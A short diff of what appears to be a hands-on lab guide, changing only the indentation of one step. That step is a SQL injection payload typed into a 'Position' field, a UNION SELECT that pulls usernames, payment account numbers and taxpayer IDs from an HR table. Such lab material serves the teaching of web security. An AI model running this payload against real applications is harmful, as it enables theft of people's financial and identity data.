@@ -114,7 +114,7 @@ You will notice the error, ‘Error while connecting to server!  Contact your ad
 
   In the Position field enter:
 
-    ' UNION SELECT 1, username, 'test', '1', '1', '1', '1', '1', '1', 0, 0, PAYMENT_ACCT_NO, TAXPAYER_ID, sysdate, sysdate, '0', 1, '1', '1', 1 FROM hr.supplemental_data --
+        ' UNION SELECT 1, username, 'test', '1', '1', '1', '1', '1', '1', 0, 0, PAYMENT_ACCT_NO, TAXPAYER_ID, sysdate, sysdate, '0', 1, '1', '1', 1 FROM hr.supplemental_data --
 
 **Note:** The 'tick' at the beginning and there is no space between the two dashes
 
